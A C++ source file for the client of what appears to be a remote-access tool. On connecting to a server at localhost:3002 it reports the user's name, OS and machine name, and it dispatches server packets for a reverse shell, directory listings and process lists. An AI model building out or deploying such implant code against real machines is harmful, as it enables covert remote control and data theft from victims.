#include "NetClientService.h"
#include "../../shared/NetLib/packets/PacketPresentation.h"
#include "services/SystemService.h"
#include "../../shared/NetLib/PacketShell.h"
#include "Application.h"
#include "../../shared/NetLib/packets/PacketFileSystem.h"


NetClientService::NetClientService(Application* app) : BaseNetClientService(new wxSocketClient), application(app)
{
}


NetClientService::~NetClientService()
{
}


void NetClientService::onPacketReceived(const std::shared_ptr<Packet>& packet)
{
	if (packet == nullptr)
		return;

	const PacketType packetType = packet->packetType;

	if (packetType == PacketType::ReverseShell)
	{
		const auto packetShell = std::dynamic_pointer_cast<PacketShell>(packet);
		application->onShellAction(packetShell->action, packetShell->data);
	}
	else if (packetType == PacketType::ClientInformation)
	{
		application->onInfoRequest();
	}
	else if (packetType == PacketType::FileSystem)
	{
		const auto packetFs = std::dynamic_pointer_cast<PacketFileSystem>(packet);
		application->onFsRequest(packetFs->path);
	}
	else if (packetType == PacketType::ProcessList)
	{
		application->onProcessRequest();
	}
}

void NetClientService::onConnectionSuccessful()
{
	wxString osName = SystemService::getOSName();
	wxString pcName = SystemService::getPcName();
	wxString username = SystemService::getUsername();
	const std::shared_ptr<Packet> packet = std::make_shared<PacketPresentation>(username, osName, pcName);
	sendPacket(packet);
}

void NetClientService::start()
{
	wxIPV4address addr;
	addr.Hostname("localhost");
	addr.Service(3002);

	// TODO: receive wxSOCKET_CONNECTION_FLAG in this class
	interactAsync();
	// Setup the event handler and subscribe to most events.

	// Fire connect
	((wxSocketClient*)clientSocket)->Connect(addr, false);
}

void NetClientService::sendShellData(const wxString& data)
{
	const std::shared_ptr<Packet> packet = std::make_shared<PacketShell>(ShellAction::MoreData, data);

	sendPacket(packet);
}

void NetClientService::sendDirEntries(const wxString& path, const std::vector<FileInfo>& files)
{
	const std::shared_ptr<PacketFileSystem> packet = std::make_shared<PacketFileSystem>(path, files);
	sendPacket(packet);
}

void NetClientService::sendProcesses(const std::vector<Process>& processes)
{
	const std::shared_ptr<PacketProcess> packet = std::make_shared<PacketProcess>();
	packet->processes = processes;
	sendPacket(packet);
}
